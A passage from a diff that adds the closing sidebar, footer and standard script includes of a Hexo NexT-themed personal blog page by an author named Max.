nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Max"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Max</p>
+  <div class="site-description" itemprop="description">文章本天成，妙手偶得之。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">86</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">92</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/juniorprincewang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;juniorprincewang" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:maxzywang@163.com" title="E-Mail → mailto:maxzywang@163.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">max</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
